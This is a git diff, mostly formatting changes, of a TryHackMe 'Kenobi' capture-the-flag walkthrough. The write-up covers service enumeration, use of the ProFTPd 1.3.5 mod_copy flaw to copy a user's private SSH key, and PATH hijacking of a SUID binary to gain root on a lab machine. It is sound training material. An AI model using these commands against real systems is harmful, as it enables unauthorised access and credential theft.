@@ -3,7 +3,7 @@ https://tryhackme.com/room/kenobi
 
 ---
 ## Initial Enumeration
-**IP Address:** 10.10.87.210
+IP Address: 10.10.87.210
 ### gobuster
 `gobuster dir -u 10.10.87.210 -w /usr/share/wordlists/dirb/common.txt -x .php,.xml,.html`
 <pre> =============================================================
@@ -152,8 +152,7 @@ Host script results:
 + 1 host(s) tested
 
 </pre>
-
-**Number of open ports = 11** (but THM has it as 7? need to investigate later)
+Number of open ports = 11 (but THM has it as 7? need to investigate later)
 --- 
 ## Samba Enumeration
 1. Run the script in the instructions:
@@ -193,16 +192,21 @@ Host script results:
 |_    Current user access: <none>
 |_smb-enum-users: ERROR: Script execution failed (use -d to debug)
 </pre>
-**Using the nmap command above, how many shares have been found?** = 3
+Using the nmap command above, how many shares have been found? = 3
+
 2. inspect a share:
 `smbclient //10.10.87.210/anonymous`
+
 enter your local password
-**Once you're connected, list the files on the share. What is the file can you see?**
+
+Once you're connected, list the files on the share. What is the file can you see?
 `ls`
 <pre> log.txt
 </pre>
 3. `cat log.txt`
+
 cat doesn't work, lets see what commands we have access to
+
 `help`
 <pre>
 smb: \> help
@@ -224,10 +228,15 @@ timeout        translate      unlock         volume         vuid
 wdel           logon          listconnect    showconnect    tcon           
 tdis           tid            utimes         logoff         ..   
 </pre>
+
 we can read it with 'more' (too much to post here)
+
 `more log.txt`
-**What port is FTP running on?:** 21
+
+What port is FTP running on?: 21
+
 4. Use the script shown to enumerate port 111 network file system:
+
 ```
 ctrl+c
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.87.210
@@ -238,13 +247,15 @@ PORT    STATE SERVICE
 | nfs-showmount: 
 |_  /var *
 </pre>
-**What mount can we see?:** /var
+What mount can we see?: /var
 --- 
 ## Gain initial access with ProFTPd
 
 1. Use Netcat to connect to the machine on the FTP port
+
 `nc 10.10.87.210 21`
-**what is the version?:** 1.3.5
+what is the version?: 1.3.5
+
 2. Use searchsploit (CLI version of [exploitdb.com](https://www.exploit-db.com/))
 `searchsploit ftp 1.3.5`
 <pre>
@@ -252,14 +263,17 @@ ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | exploits/linux/remot
 ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution | exploits/linux/remote/36803.py
 ProFTPd 1.3.5 - File Copy | exploits/linux/remote/36742.txt
 </pre>
-**How many exploits are there for ProFTPd?:** 3
+How many exploits are there for ProFTPd?: 3
+
 3.  There is a  vulnerability in the [copy CPFR/CPTO (Copy From/Copy To)](http://www.proftpd.org/docs/contrib/mod_copy.html) commands
+
 lets copy the ssh key to a place we can read it ourselves
 `SITE CPFR /home/kenobi/.ssh/id_rsa`
 <pre> 350 File or directory exists, ready for destination name </pre>
 `SITE CPTO /var/tmp/id_rsa`
 <pre> 250 Copy successful </pre>
 now the ssh key is someplace we can get to
+
 4. mount the /var/tmp directory to our machine so we can now retrieve that ssh key
 - `ctrl+c` to exit the smb interface if you haven't already
 ```
@@ -277,7 +291,7 @@ ssh -i id_rsa kenobi@10.10.87.210
 we are logged in as Kenobi!
 `ls -al`
 <pre> share      user.txt </pre>
-5. **What is Kenobi's user flag?:**
+5. What is Kenobi's user flag?:
 `cat user.txt`
 XXXXXXX**REDACTED**XXXXXXXXX
 --- 
@@ -310,7 +324,8 @@ XXXXXXX**REDACTED**XXXXXXXXX
 /bin/su
 /bin/ping6
 </pre>
-**What file looks out of the ordinary?:** /usr/bin/menu
+What file looks out of the ordinary?: /usr/bin/menu
+
 2. run the binary
 ```
 cd /usr/bin
@@ -339,6 +354,7 @@ uname -r
 ifconfig
 Invalid choice
 </pre>
+
 4. looks like these lines are the command activated by the choices made in the binary. Notice that curl is just called locally. This means that it will use whatever binary named "curl" that is in the same directory as "menu". we can change this to a command that will give us root!
 ```
 cd ~
@@ -351,9 +367,10 @@ select 1 to make the menu go to our shell named "curl".
 `id`
 <pre> id=0(root) gid=1000(kenobi) groups=1000(kenobi) </pre>
 We are root!
-5. **What is the root flag (/root/root.txt)?**
+
+5. What is the root flag (/root/root.txt)?
 ```
 cd ~
 cat /root/root.txt
 ```
-**Root flag**: XXXXXXXREDACTEDXXXXXXX
+Root flag: XXXXXXXREDACTEDXXXXXXX
